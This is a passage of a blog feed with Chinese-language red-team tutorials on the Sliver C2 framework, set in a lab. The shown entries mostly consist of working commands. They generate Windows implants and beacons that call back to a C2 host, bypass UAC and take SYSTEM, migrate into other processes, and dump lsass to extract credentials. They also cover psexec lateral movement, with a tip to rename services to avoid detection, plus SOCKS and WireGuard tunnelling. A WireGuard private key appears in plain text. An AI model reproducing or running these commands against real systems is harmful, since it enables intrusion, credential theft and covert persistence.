&#x2F;etc&#x2F;bind&#x2F;db.sliver.com 加入内容</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">TTL    604800</span><br>@       IN      SOA     ns.sliver.com. admin.sliver.com. (<br>                              2         ; Serial<br>                         604800         ; Refresh<br>                          86400         ; Retry<br>                        2419200         ; Expire<br>                         604800 )       ; Negative Cache TTL<br><br>; Name servers<br>@       IN      NS      ns.sliver.com.<br><br>; A records for name servers<br>ns      IN      A       192.168.80.128<br><br>; A records for your domain<br>www     IN      A       192.168.80.128<br></code></pre></div></td></tr></table></figure><p>添加dns系统解析，包括windows靶机也添加上去</p><p>vim &#x2F;etc&#x2F;resolv.conf</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">nameserver 192.168.80.128<br></code></pre></div></td></tr></table></figure><p>然后 named-checkzone sliver.com &#x2F;etc&#x2F;bind&#x2F;db.sliver.com 检查 回显OK搭建成功</p><p>然后启动 sudo systemctl start named.service </p><p>nslookup <a href="http://www.sliver.com/">www.sliver.com</a> 192.168.80.128 测试DNS配置</p><p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-3/image-20241103205518187.png" alt="image-20241103205518187"></p><p>开始</p><p>开始在sliver服务端中生成dns二进制木马</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">generate beacon --os windows --arch amd64 --format exe --seconds 5 --save ~/st --mtls www.sliver.com,192.168.80.128<br><br>generate --http sliver.com --canary www.sliver.com<br></code></pre></div></td></tr></table></figure><p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-3/image-20241103213433254.png" alt="image-20241103213433254"></p>]]></content>
    
    
    
    <tags>
      
      <tag>C2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SliverC2 教程(2)</title>
    <link href="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/"/>
    <url>/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/</url>
    
    <content type="html"><![CDATA[<h1 id="创建协作"><a href="#创建协作" class="headerlink" title="创建协作"></a>创建协作</h1><p>在server端一切正常的情况下，使用server端创建一位新的操作员，然后再使用客户端以此操作员的凭证连接到服务端</p><p>客户端下载地址：<a href="https://github.com/BishopFox/sliver/releases/tag/v1.5.42">https://github.com/BishopFox/sliver/releases/tag/v1.5.42</a></p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sliver-server operator --name test1 --lhost 192.168.80.128 --save st<br></code></pre></div></td></tr></table></figure><p>使用 <strong>operator</strong> 参数创建 名为 test1 地址为 192.168.80.128 配置文件存放至 st 中</p><p>还有一种创建方式是进入到sliver-server中，然后 new-operator –name pentest –lhost 192.168.<em>.</em></p><p>这个包含了身份验证的证书，客户端验证的私钥和证书，以及令牌</p><p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102162654445.png" alt="image-20241102162654445"></p><p>然后使用client带入配置文件就行</p><p>.&#x2F;sliver-client_linux import ..&#x2F;st&#x2F;test1_192.168.80.128.cfg</p><p>然后打开即可</p><p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102163156788.png" alt="image-20241102163156788"></p><h2 id="Sliver-C2-协议概述"><a href="#Sliver-C2-协议概述" class="headerlink" title="Sliver C2 协议概述"></a>Sliver C2 协议概述</h2><figure class="highlight clean"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs clean">## <span class="hljs-number">1.</span> mutual TLS (mTLS) <br><br>## <span class="hljs-number">2.</span> WireGuard <br><br>## <span class="hljs-number">3.</span> HTTP(S) <br><br>## <span class="hljs-number">4.</span> DNS<br></code></pre></div></td></tr></table></figure><p><strong>前两种协议都是官⽅⾮常推荐的</strong>，后两种则是在更为常⻅的场景中使⽤，在⼀些严格限制的环境中，如只允许 HTTP(S) 和 DNS 出⽹，那么就需要⽤到后两种协议。下面使用 mtls 创建 <a href="https://www.cloudflare.com/zh-cn/learning/access-management/what-is-mutual-tls/">https://www.cloudflare.com/zh-cn/learning/access-management/what-is-mutual-tls/</a></p><h1 id="生成二进制木马"><a href="#生成二进制木马" class="headerlink" title="生成二进制木马"></a>生成二进制木马</h1><p>​Session模式和Beacon模式。Session模式是持久连接；</p><p>​Beacon是异步通信⽅式，即执 ⾏累计的任务，定时（60s）回连，这与CobaltStrike的回连模式⼀致。</p><h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><p>使用 generate 参数在server中生成木马，使用 help generate 查看参数帮助，以下是常用参数</p><ul><li><code>--mtls 192.168.122.111</code> ：木马相互验证的 TLS 连接连接到 Sliver 服务器。其他选项包括<a href="https://cshihong.github.io/2020/10/11/WireGuard%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/">–wg （基于 WireGuard</a>）<code>--http</code> （用于 HTTP(S) 连接）或<code>--dns</code> （用于基于 DNS 的 C2）。</li><li><code>--os windows</code> ：指定我们要在 Windows 上运行植入程序（这是默认设置，因此我们可以忽略这一点）。还支持 MacOS 和 Linux。</li><li><code>--arch amd64</code> “ 指定我们需要 64 位植入（也是默认值，可以省略）。使用<code>--arch 386</code>进行 32 位植入。</li><li><code>--format exe</code> ：指定我们想要一个可执行文件（同样是默认值）。其他选项包括用于动态库的<code>--format shared</code> 、用于 Windows 服务二进制文件的<code>--format service</code> （可与<code>psexec</code>命令一起使用）和<code>shellcode</code> （仅限 Windows）。</li><li><code>--save /var/www/html/</code> ：指定保存输出文件的目录。</li></ul><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">generate <span class="hljs-params">--mtls</span> 192.168.80.128 <span class="hljs-params">--os</span> Windows <span class="hljs-params">--arch</span> amd64 <span class="hljs-params">--format</span> exe <span class="hljs-params">--save</span> <span class="hljs-string">./</span><br>使用此命令生成<br></code></pre></div></td></tr></table></figure><p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102164447407.png" alt="image-20241102164447407"></p><p>然后创建一个监听器，将木马放到测试机中，查看上线情况</p><p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102164535332.png" alt="image-20241102164535332"></p><p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102164759495.png" alt="image-20241102164759495"></p><p>运行完毕之后，在server可以看到上线通知，可以运行sessions查看会话列表，使用use接管会话</p><p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102164829242.png" alt="image-20241102164829242"></p><p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102164952258.png" alt="image-20241102164952258"></p><p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102165029546.png" alt="image-20241102165029546"></p><p>可以看到很多命令可以执行<img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102165045829.png" alt="image-20241102165045829"></p><p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102165111899.png" alt="image-20241102165111899"></p><p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102165144708.png" alt="image-20241102165144708"></p><p>background参数可以让会话后台活跃，session -k <ID>  终止会话</ID></p><h3 id="Privilege-Escalation-权限提升"><a href="#Privilege-Escalation-权限提升" class="headerlink" title="Privilege Escalation | 权限提升"></a>Privilege Escalation | 权限提升</h3><p>绕过 UAC 及获取 SYSTEM 权限</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">上传文件并执行，绕过uac提权 [这里似乎失败了]</span><br>upload /root/Desktop/uac.ps1 &quot;C:\Users\Administrator\Desktop\uac.ps1&quot;<br>execute -o powershell -ExecutionPolicy Bypass -File &quot;C:\Users\Administrator\Desktop\uac.ps1&quot;<br>getsystem<br></code></pre></div></td></tr></table></figure><h3 id="Persistence-持久化"><a href="#Persistence-持久化" class="headerlink" title="Persistence | 持久化"></a>Persistence | 持久化</h3><p>进程迁移</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">查看进程列表信息</span><br>ps<br><span class="hljs-meta prompt_"># </span><span class="language-bash">进程迁移</span><br>migrate 3108<br><span class="hljs-meta prompt_"># </span><span class="language-bash">切换进程</span><br>use 244e1361<br></code></pre></div></td></tr></table></figure><p><img src="https://shs3.b.qianxin.com/attack_forum/2023/04/attach-a01c5c3fc7c2113bbd31fcf13e54faef0a97edcd.png" alt="p9PUTII.png"></p><h3 id="Credential-Access-凭据访问"><a href="#Credential-Access-凭据访问" class="headerlink" title="Credential Access | 凭据访问"></a>Credential Access | 凭据访问</h3><p>导出 lsass.dump 信息，离线破解，需要 SYSTEM 权限。</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">导出lsass信息 [需要system权限]</span><br>procdump --pid 664 --save lsass.dump<br><span class="hljs-meta prompt_">kali&gt; </span><span class="language-bash">pypykatz lsa minidump lsass.dump</span><br></code></pre></div></td></tr></table></figure><h3 id="Discovery-深入探索"><a href="#Discovery-深入探索" class="headerlink" title="Discovery | 深入探索"></a>Discovery | 深入探索</h3><p>获取网络邻居缓存条目</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">原生命令</span><br>Get-NetNeighbor | Where-Object -Property State -NE &quot;Unreachable&quot; | Select-Object -Property IPAddress<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Sliver中执行</span><br>execute -o powershell &quot;Get-NetNeighbor | Where-Object -Property State -NE &quot;Unreachable&quot; | Select-Object -Property IPAddress&quot;<br></code></pre></div></td></tr></table></figure><p>Powershell 中进行 ping 扫描探测存活</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">1</span><br>99..102 | foreach &#123; &#x27;10.10.1.$&#123;_&#125;: $(Test-Connection -TimeToLive 64 -Count 1 -ComputerName 10.10.1.$&#123;_&#125; -Quiet)&#x27; &#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">2</span><br>99..102 | foreach &#123;(New-Object System.Net.NetworkInformation.Ping).Send(&quot;10.10.1.$&#123;_&#125;&quot;, 1000)&#125;<br></code></pre></div></td></tr></table></figure><h3 id="Lateral-Movement-横向移动"><a href="#Lateral-Movement-横向移动" class="headerlink" title="Lateral Movement | 横向移动"></a>Lateral Movement | 横向移动</h3><p>这里以 psexec 横向移动为例，进行演示。</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">创建配置文件</span><br>profiles new --format service --skip-symbols --mtls 172.16.181.182 psexec_test<br><span class="hljs-meta prompt_"># </span><span class="language-bash">执行psexec攻击</span><br>psexec -profile pentest --service-name pentest -service-description pentest red.team<br></code></pre></div></td></tr></table></figure><p>本地环境，有些配置没有开启<br><img src="https://shs3.b.qianxin.com/attack_forum/2023/04/attach-98c3a30b160937525c538a0242bd162c2b4124d8.png" alt="p9PUp8K.png"></p><h3 id="Command-Control-内网穿透"><a href="#Command-Control-内网穿透" class="headerlink" title="Command&amp;Control | 内网穿透"></a>Command&amp;Control | 内网穿透</h3><h4 id="Socks-Proxy-内网代理"><a href="#Socks-Proxy-内网代理" class="headerlink" title="Socks Proxy | 内网代理"></a>Socks Proxy | 内网代理</h4><p>Sliver C2 中搭载了内置的 Socks5 命令，用于快速创建 Socks 代理</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">socks5 start -P 9001<br></code></pre></div></td></tr></table></figure><p><img src="https://shs3.b.qianxin.com/attack_forum/2023/04/attach-6c8fa57c67fc193974d74c2e18d3536052e8ad2b.png" alt="p9PU9gO.png"></p><blockquote><p>这里是在客户端中执行的，有个疑问就是为什么可以在客户端上开启 socks 而不是在服务器，稍微复杂。</p></blockquote><p>在浏览器中设置代理<br><img src="https://shs3.b.qianxin.com/attack_forum/2023/04/attach-3fe0027b43c6bebe4b3883b52c597daafd0bc66c.png" alt="p9PUIZd.png"></p><p>在内网机器上开启简易http服务来测试<br><img src="https://shs3.b.qianxin.com/attack_forum/2023/04/attach-dcf1218ed607d02be398a8fddf9bd7f0d08013cc.png" alt="p9PUodA.png"></p><h4 id="Wireguard-端口转发"><a href="#Wireguard-端口转发" class="headerlink" title="Wireguard | 端口转发?"></a>Wireguard | 端口转发?</h4><blockquote><p>参考 - <a href="https://github.com/BishopFox/sliver/wiki/Port-Forwarding">Port Forwarding(github.com)</a></p></blockquote><p>端口转发为例：<br>创建监听器，生成Implant</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">开启WireGuard监听器</span><br>wg --lport 9100<br><span class="hljs-meta prompt_"># </span><span class="language-bash">生成对应的Implant</span><br>generate --wg 172.16.181.182:9100 --os windows --arch amd64 --format exe<br></code></pre></div></td></tr></table></figure><p>执行上线，对端的地址就配置为了100.64段<br><img src="https://shs3.b.qianxin.com/attack_forum/2023/04/attach-a71bf5836a47e4e4261bf6808d11980684c7d54c.png" alt="p9PUzZj.png"></p><p>添加端口转发，转发目标主机3389端口</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">wg-portfwd add -r 172.16.181.139:3389<br></code></pre></div></td></tr></table></figure><p><img src="https://shs3.b.qianxin.com/attack_forum/2023/04/attach-c90aa6d9042d36984d75966ff1b782f14c887252.png" alt="p9PUXQS.png"></p><p>导出 wireguard 配置文件，在其中的 Endpoint 字段设置为 Sliver 服务端的WireGuard监听器。</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">wg-config -s /usr/local/etc/wireguard/wireguard.conf<br><br>Address = 100.64.0.8/16<br>ListenPort = 51902<br>PrivateKey = uG6A0qrE95iboIM33RdkzXrKX1a99M3PcCHHm+hAyGg=<br>MTU = 1420<br>[Peer]<br>PublicKey = 4FcKBOGCHP2jvnDHZyo8Ga/iulFf0SvRzjOP85/k+DM=<br>AllowedIPs = 100.64.0.0/16<br>Endpoint = 172.16.181.182:9100<br></code></pre></div></td></tr></table></figure><p>安装 WireGuard 工具，建立通信</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">MacOS</span><br>brew install wireguard-tools<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Linux</span><br>apt install wireguard-tools<br></code></pre></div></td></tr></table></figure><p>启动 WireGuard 工具</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">wg-quick up wireguard<br></code></pre></div></td></tr></table></figure><p><img src="https://shs3.b.qianxin.com/attack_forum/2023/04/attach-0efa4b68e18a74ee591b51e34a120c857553af24.png" alt="p9PUjsg.png"><br>开启后就可以远程连接了<br>参考：<a href="https://github.com/miniactive/wall/blob/master/2.%E5%9C%A8mac%E4%B8%8A%E4%BD%BF%E7%94%A8wireguard-tools%E6%9D%A5%E5%9F%BA%E4%BA%8Ewireguard%E8%BF%9B%E8%A1%8C%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91.md#%E5%9C%A8mac%E4%B8%8B%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8">wall&#x2F;在mac上使用wireguard-tools (github.com)</a></p><h2 id="3-4-安全配置"><a href="#3-4-安全配置" class="headerlink" title="3.4 安全配置"></a>3.4 安全配置</h2><h3 id="端口修改"><a href="#端口修改" class="headerlink" title="端口修改"></a>端口修改</h3><p>修改服务端配置文件，修改为非常见常见端口</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">vi ~/.sliver/configs/server.json<br></code></pre></div></td></tr></table></figure><p><img src="https://shs3.b.qianxin.com/attack_forum/2023/04/attach-bc6ec4ba79252a359b0388ab5629f0cb4164d3f6.png" alt="p9PUvLQ.png"><br>如果生成了多操作员的配置文件，在其中修改端口选项</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">vi ~/.sliver-client/configs/x1gua_172.16.181.1.cfg<br></code></pre></div></td></tr></table></figure><p><img src="https://shs3.b.qianxin.com/attack_forum/2023/04/attach-12ec25f3b399e5655da32c34a8b5b142dee96ce0.png" alt="p9PaSds.png"></p><p>基本信息</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">用户名</span><br>whoami<br><span class="hljs-meta prompt_">#</span><span class="language-bash">ip</span><br>ifconfig<br><span class="hljs-meta prompt_">#</span><span class="language-bash">当前目录</span><br>pwd<br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看文件内容</span><br>cat [path]<br><span class="hljs-meta prompt_">#</span><span class="language-bash">切换目录</span><br>cd [location]<br><span class="hljs-meta prompt_">#</span><span class="language-bash">列目录</span><br>ls<br><span class="hljs-meta prompt_">#</span><span class="language-bash">高级操作</span><br>execute-assembly<br>execute-assembly (inline with --in-process)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">进程操作</span><br>ps [-c/--print-cmdline]<br>-c代表显示命令行参数？<br>terminate [pid]<br>procdump -p [pid]<br>migrate [pid] (Windows Only)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">上传下载</span><br>upload [local src] &lt;remote dst&gt;<br>download remote-path [local-path/.]<br><span class="hljs-meta prompt_">#</span><span class="language-bash">获取gid pid uid</span><br>getgid<br>getpid<br>getuid<br><span class="hljs-meta prompt_">#</span><span class="language-bash">关闭interactive session，不关闭进程</span><br>close<br><span class="hljs-meta prompt_">#</span><span class="language-bash">beacon转换session（需要等待beacon回连周期）（无法显示看出来，只能看颜色，红色session蓝色beacon）</span><br>interactive<br><span class="hljs-meta prompt_">#</span><span class="language-bash">文件操作</span><br>mv<br>rename<br>rm<br>mkdir<br><span class="hljs-meta prompt_">#</span><span class="language-bash">网络</span><br>netstat<br><span class="hljs-meta prompt_">#</span><span class="language-bash">链接远程ssh</span><br>ssh -l root -P root123 192.168.0.100 ls<br><span class="hljs-meta prompt_">#</span><span class="language-bash">关闭session（根据Implants名字或者session <span class="hljs-built_in">id</span>）</span><br>kill<br><span class="hljs-meta prompt_">#</span><span class="language-bash">session信息</span><br>info<br>ping(session存活否？)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">截图</span><br>screenshot<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">其他的就自己看翻译吧</span><br>  execute            Execute a program on the remote system<br>  execute-shellcode  Executes the given shellcode in the sliver process<br>  extensions         Manage extensions<br>  msf                Execute an MSF payload in the current process<br>  msf-inject         Inject an MSF payload into a process<br>  pivots             List pivots for active session<br>  portfwd            In-band TCP port forwarding<br>  reconfig           Reconfigure the active beacon/session <br>  rportfwd           reverse port forwardings<br>  shell              Start an interactive shell<br>  shikata-ga-nai     Polymorphic binary shellcode encoder（shellcode编码器，msf）<br>  sideload           Load and execute a shared object (DLL) in a remote process<br>  socks5             In-band SOCKS5 Proxy<br></code></pre></div></td></tr></table></figure><p>代理、端口相关</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">socks5开启</span><br>Start an in-band SOCKS5 proxy<br>Usage:<br>======<br>  start [flags]<br>Flags:<br>======<br>  -h, --help           display help<br>  -H, --host string    Bind a Socks5 Host (default: 127.0.0.1)<br>  -P, --port string    Bind a Socks5 Port (default: 1081)<br>  -u, --user string    socks5 auth username (will generate random password)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">socks5关闭</span><br>socks5 stop -i [ID从1开始]<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">端口转发开启</span><br>portfwd add -b 127.0.0.1:13389 -r 192.168.0.100:3389<br>portfwd rm -i [ID从1开始]<br>rportfwd 转发本地端口到远程，命令类似。<br></code></pre></div></td></tr></table></figure><p>域相关</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">getsystem<br>psexec<br><span class="hljs-meta prompt_">#</span><span class="language-bash">需要先创建profiles</span><br>profiles new --format service --skip-symbols --mtls 1.1.1.1:23333 win-svc64<br><span class="hljs-meta prompt_">#</span><span class="language-bash">创建完才能psexec，记得改名字和描述，不然会显示sliver，一看就看出来</span><br>psexec -d Description -s ServiceName -p win-svc64 TARGET_FQDN<br></code></pre></div></td></tr></table></figure><h1 id="beacon"><a href="#beacon" class="headerlink" title="beacon"></a>beacon</h1><p>生成 beacon 木马与生成 session 木马非常相似。使用<code>generate beacon</code>命令，通过<code>help generate beacon</code>了解有关的帮助。除了上面讨论的所有之外，相关的beacon还有：</p><ul><li><code>--seconds 5</code> ：指定信标应每 5 秒联系 C2 服务器一次。您也可以使用<code>--minutes</code> 、 <code>--hours</code>或<code>--days</code> 。</li><li><code>--jitter 3</code> ：指定应在 5 秒间隔中添加最多 3 秒的额外随机延迟。</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">generate beacon --mtls 192.168.80.128 --os Windows --arch amd64 --format exe --save ./ --seconds 5 --jitter 3<br></code></pre></div></td></tr></table></figure><p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102170348590.png" alt="image-20241102170348590"></p><p>使用beacons查看会话</p><p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102170405140.png" alt="image-20241102170405140"></p><p>和session一样，use接管会话，然后执行渗透，tasks查看显示完成命令</p><p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102170552840.png" alt="image-20241102170552840"></p><p>最后，也可以从beacon模式转换成session模式，使用 interactive 参数</p><p>进入use，使用interactive，可以看到，会自动转换成session模式，也可以转换成多个会话协议，具体interactive –help参数查看</p><p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102170813214.png" alt="image-20241102170813214"></p><p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102170858593.png" alt="image-20241102170858593"></p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>使用<code>profiles new</code>创建会话植入配置文件。例如，此配置文件对应于上面生成的会话配置，后续需要使用直接调用此配置文件</p><p>profiles new –mtls 192.168.80.128 –os Windows –format exe –arch amd64 配置文件1</p><p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102171200975.png" alt="image-20241102171200975"></p><p>然后再使用命令  <strong>profiles generate 配置文件1</strong> <strong>–save .&#x2F;</strong>  就可以一键生成了，beacon同理，profiles new beacon……</p><p><strong>implants</strong> 命令查看所有创建文件的描述</p><hr><p>至此，就可以正常的使用sliver功能了，一些其他用处在后续文章更新👍</p>]]></content>
    
    
    
    <tags>
      
      <tag>C2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SliverC2 教程(1)</title>
    <link href="/2024/11/01/SliverC2-%E6%95%99%E7%A8%8B-1/"/>
    <url>/2024/11/01/SliverC2-%E6%95%99%E7%A8%8B-1/</url>
    
